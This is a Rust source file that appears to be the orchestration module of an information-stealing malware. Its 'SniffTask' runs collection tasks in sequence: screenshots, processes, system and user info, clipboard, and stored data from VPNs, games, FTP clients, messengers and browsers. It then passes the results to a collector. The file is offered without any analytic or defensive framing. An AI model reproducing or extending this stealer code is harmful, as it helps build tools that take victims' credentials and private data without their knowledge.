#![no_std]
#![allow(unsafe_op_in_unsafe_fn)]

extern crate alloc;
mod clipboard;
mod processes;
mod screenshot;
mod systeminfo;
mod userinfo;

use crate::clipboard::ClipboardTask;
use crate::processes::ProcessesTask;
use crate::screenshot::ScreenshotTask;
use crate::systeminfo::SystemInfoTask;
use crate::userinfo::UserInfoTask;
use alloc::boxed::Box;
use alloc::vec;
use browsers::BrowsersTask;
use collector::Collector;
use filesystem::path::Path;
use filesystem::FileSystem;
use ftp::FtpTask;
use games::GamesTask;
use messengers::MessengersTask;
use tasks::{composite_task, CompositeTask, Task};
use vpn::VpnTask;

pub struct SniffTask<C: Collector, F: FileSystem> {
    inner: CompositeTask<C, F>,
    subtask: Option<Box<dyn Task<C, F>>>,
}

impl<C: Collector + 'static, F: FileSystem + 'static> Default for SniffTask<C, F> {
    fn default() -> Self {
        Self {
            inner: composite_task!(
                ScreenshotTask,
                ProcessesTask,
                SystemInfoTask,
                ClipboardTask,
                UserInfoTask,
                VpnTask::default(),
                GamesTask::default(),
                FtpTask::default(),
                MessengersTask::default(),
                BrowsersTask::default(),
            ),
            subtask: None,
        }
    }
}

impl<C: Collector + 'static, F: FileSystem + 'static> SniffTask<C, F> {
    pub fn with_subtask<T>(subtask: T) -> Self
    where
        T: Task<C, F> + 'static,
    {
        Self {
            subtask: Some(Box::new(subtask)),
            ..Self::default()
        }
    }
}

impl<C: Collector, F: FileSystem> Task<C, F> for SniffTask<C, F> {
    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        self.inner.run(parent, filesystem, collector);

        if let Some(subtask) = &self.subtask {
            subtask.run(parent, filesystem, collector);
        }
    }
}
